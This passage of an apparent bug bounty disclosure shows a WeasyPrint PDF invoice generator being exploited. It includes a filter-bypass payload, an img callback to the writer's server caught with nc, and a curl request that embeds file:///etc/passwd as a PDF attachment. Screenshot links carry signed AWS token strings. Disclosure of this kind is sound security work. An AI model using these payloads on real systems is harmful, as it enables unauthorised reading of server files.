data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/522/d87f293e13f10d1126c0e792c561f2571ea123e4/Selection_214.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_214.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_214.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8d41d86742ea4e6ddcfd868148033a3b80f5c24568b9d84ba43f012d34b8b5d7\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/522/d87f293e13f10d1126c0e792c561f2571ea123e4/Selection_214.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_214.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_214.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8d41d86742ea4e6ddcfd868148033a3b80f5c24568b9d84ba43f012d34b8b5d7\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe tried to close the style tag with \u003ccode\u003e\u0026lt;/style\u0026gt;\u003c/code\u003e but apparently it got stripped out. Looks like the work of some shitty WAF. It didn\u0026#39;t take us long to use it\u0026#39;s stripping against itself \u003ccode\u003e\u0026lt;/sty\u0026lt;/style\u0026gt;le\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_215.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/524/187a7384a2c790c12029cf40290bb2dff9d0ac49/Selection_215.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_215.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_215.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=e356d976d7bc25539a841f2aac46a8d4a50793a2b15932870e0fbf1df40fd347\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/524/187a7384a2c790c12029cf40290bb2dff9d0ac49/Selection_215.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_215.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_215.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=e356d976d7bc25539a841f2aac46a8d4a50793a2b15932870e0fbf1df40fd347\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe only thing left now is to get a LFD. I leaked information about the backend PDF to HTML parser by adding a rogue img tag pointing to my server. Here was the request I received\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eubuntu@ip-172-31-22-54:~$ nc -nlvp 8182\nListening on [0.0.0.0] (family 0, port 8182)\nConnection from 104.196.12.98 50666 received!\nGET / HTTP/1.1\nHost: p.hacker.af:8182\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like it\u0026#39;s using \u003ca href=\"/redirect?url=https%3A%2F%2Fweasyprint.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWeasyPrint\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to parse the HTML into PDF. I had never encountered it before, so I began reading the documentation.\u003c/p\u003e\n\n\u003cp\u003eIt doesn\u0026#39;t support Javascript, but the security section on the Tutorial page seems promising.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_216.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/528/85f719eb9ea934140f3ec0aec527c28c9f4f74c4/Selection_216.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_216.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_216.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=b1b7c6ca38c17e9aa07d04b79a4fbc1b476c03bab34ecaa8ba45590dc9ad7db1\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/528/85f719eb9ea934140f3ec0aec527c28c9f4f74c4/Selection_216.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_216.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_216.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=b1b7c6ca38c17e9aa07d04b79a4fbc1b476c03bab34ecaa8ba45590dc9ad7db1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt basically states we can access local files using \u003ccode\u003efile://\u003c/code\u003e URI. But unfortunately, neither iframes or embed/object tags worked with local files. All of those just displayed a blank blox.\u003c/p\u003e\n\n\u003cp\u003eI was out of ideas, so I decided to postpone the hacking to later than night (back when I\u0026#39;d be in hotel). \u003c/p\u003e\n\n\u003cp\u003eAt around midnight, I started again and began reading the documentation again. That\u0026#39;s when I stumbled upon the \u003ca href=\"/redirect?url=https%3A%2F%2Fweasyprint.readthedocs.io%2Fen%2Fstable%2Ffeatures.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efeatures\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e page. \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_217.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/530/26753290d90275eb0c74037b172c0f97b39477f4/Selection_217.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_217.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_217.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=86b3831e97b5dbeefae46b75142fbecc4545dae327390b4de59845d0637485d2\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/530/26753290d90275eb0c74037b172c0f97b39477f4/Selection_217.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_217.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_217.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=86b3831e97b5dbeefae46b75142fbecc4545dae327390b4de59845d0637485d2\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHere is the interesting part:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eAttachments are related files, embedded in the PDF itself. They can be specified through \u0026lt;link rel=attachment\u0026gt; elements to add resources globally or through regular links with \u0026lt;a rel=attachment\u0026gt; to attach a resource that can be saved by clicking on said link. The title attribute can be used as description of the attachment.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo basically if I make the \u003ccode\u003e\u0026lt;link\u0026gt;\u003c/code\u003e tag with \u003ccode\u003erel=\u0026quot;attachment\u0026quot;\u003c/code\u003e, it will store the reference as a \u0026quot;attachment\u0026quot; in the PDF. Let\u0026#39;s try using it with a reference to \u003ccode\u003efile:///etc/passwd\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files/pdfhack# curl -g --proxy socks5h://localhost:6666 \u0026#39;http://172.19.0.3/invoices/pdfize?d={\u0026quot;companyName\u0026quot;:\u0026quot;Acme Tools\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;accounting@acme.com\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;0001\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;2019-04-01\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;10\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;body\u0026quot;:{\u0026quot;background-color:white}\u0026lt;/sty\u0026lt;/style\u0026gt;le\u0026gt;\u0026lt;link rel=\\\u0026quot;attachment\\\u0026quot; href=\\\u0026quot;file:///etc/passwd\\\u0026quot;\u0026gt;\u0026quot;:\u0026quot;white\u0026quot;}}}\u0026#39;  -o out.pdf\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 19735  100 19735    0     0  44649      0 --:--:-- --:--:-- --:--:-- 44649\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe attachment won\u0026#39;t be visible directly in the document and since my PDF viewer didn\u0026#39;t support extraction of attachments, I used \u003ccode\u003epdftk\u003c/code\u003e to extract the attachments.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files/pdfhack# pdftk out.pdf unpack_files\n\nroot@pwnbox16:~/files/pdfhack# ls -l\ntotal 24\n-rw-rw-r-- 1 root root 19735 Mar  3 08:40 out.pdf\n-rw-r--r-- 1 root root  1020 Mar  3 08:43 